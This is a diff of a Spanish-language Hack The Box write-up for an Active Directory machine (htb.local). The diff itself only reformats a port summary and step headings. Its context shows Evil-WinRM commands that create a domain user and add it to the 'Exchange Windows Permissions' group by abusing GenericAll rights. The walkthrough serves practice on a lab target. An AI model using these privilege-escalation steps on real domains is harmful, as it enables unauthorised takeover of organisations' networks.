@@ -117,9 +117,13 @@ Host script results:
 Al haber tantos puertos, extraigo la información más relevante para poder seguir un orden y no perderme.
 
 > Kerberos en el puerto 88
+
 > LDAP puertos 389/636
+
 > SMB puerto 445
+
 > WinRM puerto 5985
+
 > Dominio htb.local
 
 # SMB
@@ -213,21 +217,21 @@ Pero debemos conseguir formar parte de ese grupo
 
 Busco información sobre los permisos Generic All para proceder a crear un nuevo usuario y meterlo en el grupo que queremos.
 
-1. Creamos un usuario y lo añadimos al dominio.
+> Creamos un usuario y lo añadimos al dominio.
 
 ```ps
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user elc4br4 elc4br4 /add /domain 
 The command completed successfully.
 ```
 
-2. Añadimos el nuevo usuario al grupo EXCHANGE WINDOWS PERMISSIONS
+> Añadimos el nuevo usuario al grupo EXCHANGE WINDOWS PERMISSIONS
 
 ```ps
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add elc4br4
 The command completed successfully.
 ```
 
-3. Lo comprobamos:
+> Lo comprobamos:
 
 ```ps
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions"
